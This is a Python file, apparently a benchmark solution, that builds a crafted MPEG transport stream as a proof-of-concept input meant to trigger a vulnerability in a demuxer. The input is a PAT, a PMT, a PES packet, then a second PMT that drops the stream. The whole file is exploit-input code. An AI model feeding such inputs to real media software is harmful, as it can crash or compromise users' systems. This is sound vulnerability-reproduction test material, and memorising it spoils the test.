class Solution:
    def _crc32_mpeg2(self, data: bytes) -> int:
        crc = 0xFFFFFFFF
        poly = 0x04C11DB7
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
        return crc & 0xFFFFFFFF

    def _create_psi_section(self, table_id: int, table_data: bytes) -> bytes:
        section_length = len(table_data) + 4
        
        header = bytearray()
        header.append(table_id)
        header.append(0b10110000 | ((section_length >> 8) & 0x0F))
        header.append(section_length & 0xFF)

        full_section_data = header + table_data
        crc = self._crc32_mpeg2(full_section_data)

        return full_section_data + crc.to_bytes(4, 'big')

    def _create_ts_packet(self, pid: int, payload: bytes, continuity_counter: int, pusi: bool = False) -> bytes:
        header = bytearray(4)
        header[0] = 0x47

        pusi_bit = 1 if pusi else 0
        header[1] = (pusi_bit << 6) | ((pid >> 8) & 0x1F)
        header[2] = pid & 0xFF

        header[3] = (0b0001 << 4) | (continuity_counter & 0x0F)

        packet = bytes(header)
        payload_len = 188 - 4
        
        if len(payload) > payload_len:
            payload = payload[:payload_len]
        
        packet += payload
        packet += b'\xff' * (188 - len(packet))

        return packet

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        PAT_PID = 0x0000
        PMT_PID = 0x0100
        ES_PID = 0x0101

        cc = {PAT_PID: 0, PMT_PID: 0, ES_PID: 0}
        def get_cc(pid: int) -> int:
            val = cc[pid]
            cc[pid] = (val + 1) % 16
            return val

        pat_table_data = b'\x00\x01' \
                         b'\xc1\x00\x00' \
                         b'\x00\x01' + \
                         (0xE000 | PMT_PID).to_bytes(2, 'big')

        pat_section = self._create_psi_section(0x00, pat_table_data)
        pat_payload = b'\x00' + pat_section
        pat_packet = self._create_ts_packet(PAT_PID, pat_payload, get_cc(PAT_PID), pusi=True)

        pmt_v1_table_data = b'\x00\x01' \
                            b'\xc1\x00\x00' + \
                            (0xE000 | ES_PID).to_bytes(2, 'big') + \
                            b'\xf0\x00' \
                            b'\x1b' + \
                            (0xE000 | ES_PID).to_bytes(2, 'big') + \
                            b'\xf0\x00'

        pmt_v1_section = self._create_psi_section(0x02, pmt_v1_table_data)
        pmt_v1_payload = b'\x00' + pmt_v1_section
        pmt_v1_packet = self._create_ts_packet(PMT_PID, pmt_v1_payload, get_cc(PMT_PID), pusi=True)

        pes_header = b'\x00\x00\x01\xe0\x00\x00\x80\x00'
        es_packet1 = self._create_ts_packet(ES_PID, pes_header, get_cc(ES_PID), pusi=True)

        pmt_v2_table_data = b'\x00\x01' \
                            b'\xc3\x00\x00' + \
                            (0xE000 | ES_PID).to_bytes(2, 'big') + \
                            b'\xf0\x00'

        pmt_v2_section = self._create_psi_section(0x02, pmt_v2_table_data)
        pmt_v2_payload = b'\x00' + pmt_v2_section
        pmt_v2_packet = self._create_ts_packet(PMT_PID, pmt_v2_payload, get_cc(PMT_PID), pusi=True)

        es_packet2 = self._create_ts_packet(ES_PID, pes_header, get_cc(ES_PID), pusi=True)

        poc = pat_packet + pmt_v1_packet + es_packet1 + pmt_v2_packet + es_packet2

        return poc